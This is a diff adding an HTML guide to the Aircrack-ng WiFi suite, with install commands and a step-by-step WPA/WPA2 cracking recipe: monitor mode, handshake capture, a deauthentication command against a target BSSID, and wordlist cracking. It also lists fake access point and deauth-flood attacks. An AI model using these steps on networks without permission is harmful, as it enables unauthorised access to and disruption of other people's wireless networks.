@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Aircrack-ng Tool Guide</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #00ff00;
+      font-family: 'Courier New', monospace;
+      padding: 30px;
+      line-height: 2;
+    }
+    h1 {
+      font-size: 44px;
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    h2 {
+      font-size: 30px;
+      color: #00ffff;
+      border-bottom: 2px solid #00ff00;
+      padding-bottom: 10px;
+      margin-top: 40px;
+    }
+    p, li {
+      font-size: 20px;
+    }
+    code {
+      background: #111;
+      color: #00ffff;
+      padding: 6px 12px;
+      display: inline-block;
+      border-radius: 5px;
+      margin: 5px 0;
+    }
+    ul, ol {
+      padding-left: 30px;
+    }
+    li {
+      margin-bottom: 12px;
+    }
+    a {
+      color: #00ffff;
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>📡 Aircrack-ng Tool Guide</h1>
+
+  <h2>What is Aircrack-ng?</h2>
+  <p>
+    <strong>Aircrack-ng</strong> is a powerful WiFi hacking suite used to assess wireless network security. It can capture packets, crack WEP/WPA/WPA2 keys, and perform replay, deauthentication, fake access point, and brute-force attacks.
+  </p>
+
+  <h2>Key Features</h2>
+  <ul>
+    <li>Wireless packet capture</li>
+    <li>WEP/WPA/WPA2-PSK key cracking</li>
+    <li>Monitor mode and packet injection</li>
+    <li>Support for many wireless cards and drivers</li>
+  </ul>
+
+  <h2>Installation</h2>
+  <h3>On Termux:</h3>
+  <code>pkg install root-repo</code><br>
+  <code>pkg install aircrack-ng</code>
+
+  <h3>On Kali Linux:</h3>
+  <code>sudo apt install aircrack-ng</code>
+
+  <h3>Verify Installation:</h3>
+  <code>aircrack-ng --help</code>
+
+  <h2>Step-by-Step Usage (WPA/WPA2)</h2>
+  <ol>
+    <li>Enable monitor mode:
+      <br><code>airmon-ng start wlan0</code>
+    </li>
+    <li>Find target network:
+      <br><code>airodump-ng wlan0mon</code>
+    </li>
+    <li>Capture handshake:
+      <br><code>airodump-ng -c [channel] --bssid [router BSSID] -w capture wlan0mon</code>
+    </li>
+    <li>Deauthenticate client:
+      <br><code>aireplay-ng --deauth 10 -a [BSSID] wlan0mon</code>
+    </li>
+    <li>Crack password:
+      <br><code>aircrack-ng -w wordlist.txt capture.cap</code>
+    </li>
+  </ol>
+
+  <h2>Example Command</h2>
+  <code>aircrack-ng -w rockyou.txt capture-01.cap</code>
+
+  <h2>Tools in the Aircrack-ng Suite</h2>
+  <ul>
+    <li><strong>airodump-ng</strong> – Packet capturing tool</li>
+    <li><strong>aireplay-ng</strong> – Packet injection (deauth, fake auth)</li>
+    <li><strong>aircrack-ng</strong> – Cracks captured WPA handshakes</li>
+    <li><strong>airmon-ng</strong> – Puts card into monitor mode</li>
+    <li><strong>airbase-ng</strong> – Fake AP attacks</li>
+  </ul>
+
+  <h2>Supported Attacks</h2>
+  <ul>
+    <li>WEP cracking</li>
+    <li>WPA handshake cracking</li>
+    <li>Fake authentication</li>
+    <li>ARP request replay</li>
+    <li>Deauthentication flood</li>
+  </ul>
+
+  <h2>⚠️ Important Notes</h2>
+  <ul>
+    <li>Requires root permissions for full functionality</li>
+    <li>Ensure your wireless adapter supports monitor mode</li>
+    <li>Use legally only on your own networks or with permission</li>
+  </ul>
+
+</body>
+</html>
